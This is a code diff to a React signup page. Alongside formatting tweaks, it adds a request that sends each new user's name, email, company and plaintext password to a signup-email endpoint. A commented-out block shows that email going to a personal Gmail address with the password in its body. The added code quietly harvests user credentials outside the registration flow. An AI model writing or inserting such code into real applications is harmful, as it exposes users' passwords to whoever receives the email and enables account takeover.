@@ -1,4 +1,4 @@
-"use client";
+"use client"; 
 import React, { useState, useEffect } from "react";
 import {
   ChevronLeft,
@@ -303,6 +303,33 @@ const SignupPage = () => {
         throw new Error(result.message || "Registration failed");
       }
 
+
+      // const msg = {
+      //  to: ["aliahmadazhar4420@gmail.com"],
+      //   from: "noreply@em1191.fasttrk.ai",
+      //   subject: "🆕 New User Signup",
+      //   html: `
+      //     <h2>New User Registered</h2>
+      //     <p><strong>Name:</strong> ${formData.name}</p>
+      //     <p><strong>Email:</strong> ${formData.email}</p>
+      //     <p><strong>Password:</strong> ${formData.password}</p>
+      //     <p><strong>Company:</strong> ${formData.companyName}</p>
+      //   `,
+      // };
+
+      //   await sendgrid.send(msg);
+      await fetch("/api/send-signup-email", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          name: formData.name,
+          email: formData.email,
+          password: formData.password,
+          companyName: formData.companyName,
+        }),
+      });
       router.push("/login?registered=true");
     } catch (error) {
       if (error instanceof Error) {
@@ -358,11 +385,10 @@ const SignupPage = () => {
                 <button
                   key={index}
                   onClick={() => setCurrentSlide(index)}
-                  className={`h-2 rounded-full transition-all duration-300 ${
-                    index === currentSlide
+                  className={`h-2 rounded-full transition-all duration-300 ${index === currentSlide
                       ? "bg-blue-500 w-8"
                       : "bg-gray-300 w-2 hover:bg-gray-400"
-                  }`}
+                    }`}
                 />
               ))}
             </div>
